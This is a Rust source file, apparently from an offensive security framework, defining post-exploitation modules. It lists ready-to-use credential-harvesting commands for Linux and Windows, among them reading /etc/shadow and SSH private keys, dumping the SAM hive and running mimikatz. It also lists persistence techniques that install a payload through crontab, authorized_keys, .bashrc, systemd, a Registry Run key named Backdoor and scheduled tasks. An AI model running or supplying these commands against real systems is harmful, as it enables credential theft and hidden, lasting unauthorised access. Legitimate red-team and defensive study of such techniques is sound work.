//! Post-Exploitation Modules

use crate::{ModuleInfo, Result};

pub trait PostModule: Send + Sync {
    fn info(&self) -> ModuleInfo;
    fn run(&self, session_id: &str) -> Result<PostResult>;
}

#[derive(Debug)]
pub struct PostResult {
    pub success: bool,
    pub loot: Vec<Loot>,
    pub message: String,
}

#[derive(Debug, Clone)]
pub struct Loot {
    pub loot_type: LootType,
    pub data: Vec<u8>,
    pub description: String,
}

#[derive(Debug, Clone)]
pub enum LootType {
    Password,
    Hash,
    PrivateKey,
    Token,
    Cookie,
    File,
    Screenshot,
    Keylog,
}

/// Credential harvesting
pub struct CredentialDump;

impl CredentialDump {
    pub fn linux_commands() -> Vec<&'static str> {
        vec![
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat ~/.ssh/id_rsa",
            "cat ~/.bash_history",
            "grep -r password /home",
            "find / -name '*.conf' 2>/dev/null | xargs grep -l password",
        ]
    }

    pub fn windows_commands() -> Vec<&'static str> {
        vec![
            "reg save HKLM\\SAM sam.save",
            "reg save HKLM\\SYSTEM system.save",
            "mimikatz.exe \"sekurlsa::logonpasswords\" exit",
            "type C:\\Users\\*\\.ssh\\id_rsa",
            "cmdkey /list",
        ]
    }
}

/// Persistence mechanisms
pub struct Persistence;

impl Persistence {
    pub fn linux_methods() -> Vec<(&'static str, &'static str)> {
        vec![
            ("Cron", "echo '* * * * * /path/to/payload' >> /etc/crontab"),
            ("SSH Key", "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys"),
            ("Bashrc", "echo '/path/to/payload &' >> ~/.bashrc"),
            ("Systemd", "Create /etc/systemd/system/backdoor.service"),
        ]
    }

    pub fn windows_methods() -> Vec<(&'static str, &'static str)> {
        vec![
            ("Registry Run", r"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d C:\payload.exe"),
            ("Scheduled Task", "schtasks /create /tn Backdoor /tr C:\\payload.exe /sc onlogon"),
            ("WMI", "wmic /namespace:\\\\root\\subscription ..."),
        ]
    }
}
